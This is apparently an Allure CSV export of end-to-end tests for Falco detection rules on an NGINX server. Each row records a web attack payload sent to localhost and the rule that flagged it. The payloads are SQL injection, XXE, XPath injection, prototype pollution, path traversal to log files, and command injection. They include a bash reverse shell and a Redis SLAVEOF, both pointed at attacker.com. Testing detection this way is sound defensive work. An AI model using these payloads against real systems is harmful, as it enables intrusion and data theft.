"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_CASE_001` |
| **Name** | Random Case UNION Injection |
| **Category** | SQLI |
| **Subcategory** | case_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `'uNiOn SeLeCt NuLl,VeRsIoN(),NuLl--`
- **Encoded**: `'uNiOn%20SeLeCt%20NuLl%2CVeRsIoN()%2CNuLl--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~33000ms
- **Timestamp**: 13:44:40.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_CASE_001-1771076680465-3lg3fe pattern_id=SQLI_CASE_001 uri=/?q='uNiOn%20SeLeCt%20NuLl%2CVeRsIoN()%2CNuLl-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_CASE_001-1771076680465-3lg3fe pattern_id=SQLI_CASE_001 uri=/?q='uNiOn%20SeLeCt%20NuLl%2CVeRsIoN()%2CNuLl-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:40.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_CASE_001-1771076680465-3lg3fe pattern_id=SQLI_CASE_001 uri=/?q='uNiOn%20SeLeCt%20NuLl%2CVeRsIoN()%2CNuLl-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[060_SQLI_CASE_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_UNION_003` |
| **Name** | Database information extraction |
| **Category** | SQLI |
| **Subcategory** | union_based |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' UNION SELECT version(),user(),database() --`
- **Encoded**: `%27%20UNION%20SELECT%20version%28%29%2Cuser%28%29%2Cdatabase%28%29%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~70000ms
- **Timestamp**: 13:44:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_UNION_003-1771076643378-4zrty pattern_id=SQLI_UNION_003 uri=/?q=%27%20UNION%20SELECT%20version%28%29%2Cuser%28%29%2Cdatabase%28%29%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_UNION_003-1771076643378-4zrty pattern_id=SQLI_UNION_003 uri=/?q=%27%20UNION%20SELECT%20version%28%29%2Cuser%28%29%2Cdatabase%28%29%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:03.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_UNION_003-1771076643378-4zrty pattern_id=SQLI_UNION_003 uri=/?q=%27%20UNION%20SELECT%20version%28%29%2Cuser%28%29%2Cdatabase%28%29%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[118_SQLI_UNION_003]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_004` |
| **Name** | Authentication log access |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/var/log/auth.log`
- **Encoded**: `/var/log/auth.log`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~73000ms
- **Timestamp**: 13:44:00.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_004-1771076640348-qdrjnm pattern_id=PATH_ABS_004 uri=/?q=/var/log/auth.log client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_004-1771076640348-qdrjnm pattern_id=PATH_ABS_004 uri=/?q=/var/log/auth.log client=127.0.0.1

**Falco Log Entry**:
```
13:44:00.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_004-1771076640348-qdrjnm pattern_id=PATH_ABS_004 uri=/?q=/var/log/auth.log client=127.0.0.1
```","2","test_e2e_with_logs[214_PATH_ABS_004]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_SOAP_001` |
| **Name** | XXE in SOAP Envelope |
| **Category** | XXE |
| **Subcategory** | soap_xxe |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://internal-service:8080/admin"">]><soap:Body>&xxe;</soap:Body>`
- **Encoded**: `%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Finternal-service%3A8080%2Fadmin%22%3E%5D%3E%3Csoap%3ABody%3E%26xxe%3B%3C%2Fsoap%3ABody%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~57000ms
- **Timestamp**: 13:44:16.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_SOAP_001-1771076656840-aank76 pattern_id=XXE_SOAP_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Finternal-service%3A8080%2Fadmin%22%3E%5D%3E%3Csoap%3ABody%3E%26xxe%3B%3C%2Fsoap%3ABody%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_SOAP_001-1771076656840-aank76 pattern_id=XXE_SOAP_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Finternal-service%3A8080%2Fadmin%22%3E%5D%3E%3Csoap%3ABody%3E%26xxe%3B%3C%2Fsoap%3ABody%3E client=127.0.0.1

**Falco Log Entry**:
```
13:44:16.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_SOAP_001-1771076656840-aank76 pattern_id=XXE_SOAP_001 uri=/?q=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Finternal-service%3A8080%2Fadmin%22%3E%5D%3E%3Csoap%3ABody%3E%26xxe%3B%3C%2Fsoap%3ABody%3E client=127.0.0.1
```","2","test_e2e_with_logs[614_XXE_SOAP_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_005` |
| **Name** | Double quote boolean injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `"" OR ""1""=""1`
- **Encoded**: `%22%20OR%20%221%22%3D%221`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~81000ms
- **Timestamp**: 13:43:52.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1771076632354-6qwmtd pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1771076632354-6qwmtd pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:43:52.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1771076632354-6qwmtd pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[036_SQLI_BOOL_005]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ORDER_001` |
| **Name** | ORDER BY Subquery Injection |
| **Category** | SQLI |
| **Subcategory** | order_by_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `1 ORDER BY (SELECT 1 FROM information_schema.tables)--`
- **Encoded**: `1%20ORDER%20BY%20(SELECT%201%20FROM%20information_schema.tables)--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 13:44:41.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ORDER_001-1771076681968-civxyf pattern_id=SQLI_ORDER_001 uri=/?q=1%20ORDER%20BY%20(SELECT%201%20FROM%20information_schema.tables)-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ORDER_001-1771076681968-civxyf pattern_id=SQLI_ORDER_001 uri=/?q=1%20ORDER%20BY%20(SELECT%201%20FROM%20information_schema.tables)-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:41.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ORDER_001-1771076681968-civxyf pattern_id=SQLI_ORDER_001 uri=/?q=1%20ORDER%20BY%20(SELECT%201%20FROM%20information_schema.tables)-- client=127.0.0.1 method=GET
```","3","test_e2e_with_logs[084_SQLI_ORDER_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_FUNC_006` |
| **Name** | XPath translate function injection |
| **Category** | XPATH |
| **Subcategory** | function_abuse |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `translate(//user[1]/name,'abc','ABC')`
- **Encoded**: `translate%28%2F%2Fuser%5B1%5D%2Fname%2C%27abc%27%2C%27ABC%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~44000ms
- **Timestamp**: 13:44:29.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XPath Injection] XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_006-1771076669346-gxjjj pattern_id=XPATH_FUNC_006 uri=/?q=translate%28%2F%2Fuser%5B1%5D%2Fname%2C%27abc%27%2C%27ABC%27%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_006-1771076669346-gxjjj pattern_id=XPATH_FUNC_006 uri=/?q=translate%28%2F%2Fuser%5B1%5D%2Fname%2C%27abc%27%2C%27ABC%27%29 client=127.0.0.1

**Falco Log Entry**:
```
13:44:29.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_FUNC_006-1771076669346-gxjjj pattern_id=XPATH_FUNC_006 uri=/?q=translate%28%2F%2Fuser%5B1%5D%2Fname%2C%27abc%27%2C%27ABC%27%29 client=127.0.0.1
```","2","test_e2e_with_logs[510_XPATH_FUNC_006]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_PROTO_001` |
| **Name** | Prototype Pollution Attack |
| **Category** | API_SECURITY |
| **Subcategory** | prototype_pollution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{""__proto__"":{""isAdmin"":true}}`
- **Encoded**: `%7B%22__proto__%22%3A%7B%22isAdmin%22%3Atrue%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~36000ms
- **Timestamp**: 13:44:37.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_PROTO_001-1771076677830-8cri92 pattern_id=API_PROTO_001 uri=/?q=%7B%22__proto__%22%3A%7B%22isAdmin%22%3Atrue%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_PROTO_001-1771076677830-8cri92 pattern_id=API_PROTO_001 uri=/?q=%7B%22__proto__%22%3A%7B%22isAdmin%22%3Atrue%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
13:44:37.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_PROTO_001-1771076677830-8cri92 pattern_id=API_PROTO_001 uri=/?q=%7B%22__proto__%22%3A%7B%22isAdmin%22%3Atrue%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[589_API_PROTO_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_WIN_001` |
| **Name** | Windows directory listing |
| **Category** | CMDINJ |
| **Subcategory** | windows_cmd |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `& dir`
- **Encoded**: `%26%20dir`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~66000ms
- **Timestamp**: 13:44:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_WIN_001-1771076647353-ddnpsl pattern_id=CMD_WIN_001 uri=/?q=%26%20dir client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_WIN_001-1771076647353-ddnpsl pattern_id=CMD_WIN_001 uri=/?q=%26%20dir client=127.0.0.1

**Falco Log Entry**:
```
13:44:07.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_WIN_001-1771076647353-ddnpsl pattern_id=CMD_WIN_001 uri=/?q=%26%20dir client=127.0.0.1
```","1","test_e2e_with_logs[372_CMD_WIN_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `NOSQL_REDIS_003` |
| **Name** | Redis SLAVEOF Command Injection |
| **Category** | NOSQL_EXTENDED |
| **Subcategory** | redis |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `SLAVEOF attacker.com 6379`
- **Encoded**: `SLAVEOF%20attacker.com%206379`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 13:44:39.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Redis command injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Redis command injection test_id=NOSQL_REDIS_003-1771076679848-b9yifk pattern_id=NOSQL_REDIS_003 uri=/?q=SLAVEOF%20attacker.com%206379 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Redis command injection test_id=NOSQL_REDIS_003-1771076679848-b9yifk pattern_id=NOSQL_REDIS_003 uri=/?q=SLAVEOF%20attacker.com%206379 client=127.0.0.1

**Falco Log Entry**:
```
13:44:39.000000000: Critical [NGINX Emerging Threat] Redis command injection test_id=NOSQL_REDIS_003-1771076679848-b9yifk pattern_id=NOSQL_REDIS_003 uri=/?q=SLAVEOF%20attacker.com%206379 client=127.0.0.1
```","2","test_e2e_with_logs[599_NOSQL_REDIS_003]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_060` |
| **Name** | Backtick Command Execution |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: ``id``
- **Encoded**: `%60id%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~48000ms
- **Timestamp**: 13:44:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_ADV_060-1771076665894-7olcyn pattern_id=CMD_ADV_060 uri=/?q=%60id%60 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_ADV_060-1771076665894-7olcyn pattern_id=CMD_ADV_060 uri=/?q=%60id%60 client=127.0.0.1

**Falco Log Entry**:
```
13:44:25.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_ADV_060-1771076665894-7olcyn pattern_id=CMD_ADV_060 uri=/?q=%60id%60 client=127.0.0.1
```","2","test_e2e_with_logs[288_CMD_ADV_060]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_006` |
| **Name** | Apache log file access |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `../../var/log/apache2/access.log`
- **Encoded**: `../../var/log/apache2/access.log`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~77000ms
- **Timestamp**: 13:43:56.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_006-1771076636339-f034xq pattern_id=PATH_DOT_006 uri=/?q=../../var/log/apache2/access.log client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_006-1771076636339-f034xq pattern_id=PATH_DOT_006 uri=/?q=../../var/log/apache2/access.log client=127.0.0.1

**Falco Log Entry**:
```
13:43:56.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_006-1771076636339-f034xq pattern_id=PATH_DOT_006 uri=/?q=../../var/log/apache2/access.log client=127.0.0.1
```","2","test_e2e_with_logs[249_PATH_DOT_006]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASH_002` |
| **Name** | Bash reverse shell |
| **Category** | CMDI |
| **Subcategory** | bash_specific |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `&& bash -i >& /dev/tcp/attacker.com/4444 0>&1`
- **Encoded**: `%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~42000ms
- **Timestamp**: 13:44:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_002-1771076671909-i9a6j pattern_id=CMD_BASH_002 uri=/?q=%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_002-1771076671909-i9a6j pattern_id=CMD_BASH_002 uri=/?q=%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261 client=127.0.0.1

**Falco Log Entry**:
```
13:44:31.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_002-1771076671909-i9a6j pattern_id=CMD_BASH_002 uri=/?q=%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261 client=127.0.0.1
```","2","test_e2e_with_logs[302_CMD_BASH_002]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_PAREN_004` |
| **Name** | XPath parenthesis bypass with position function |
| **Category** | XPATH |
| **Subcategory** | authentication_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `') or position()=1 or ('`
- **Encoded**: `%27%29%20or%20position%28%29%3D1%20or%20%28%27`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~41000ms
- **Timestamp**: 13:44:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XPath Injection] XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_PAREN_004-1771076672853-3jt2ej pattern_id=XPATH_PAREN_004 uri=/?q=%27%29%20or%20position%28%29%3D1%20or%20%28%27 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_PAREN_004-1771076672853-3jt2ej pattern_id=XPATH_PAREN_004 uri=/?q=%27%29%20or%20position%28%29%3D1%20or%20%28%27 client=127.0.0.1

**Falco Log Entry**:
```
13:44:32.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_PAREN_004-1771076672853-3jt2ej pattern_id=XPATH_PAREN_004 uri=/?q=%27%29%20or%20position%28%29%3D1%20or%20%28%27 client=127.0.0.1
```","2","test_e2e_with_logs[586_XPATH_PAREN_004]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
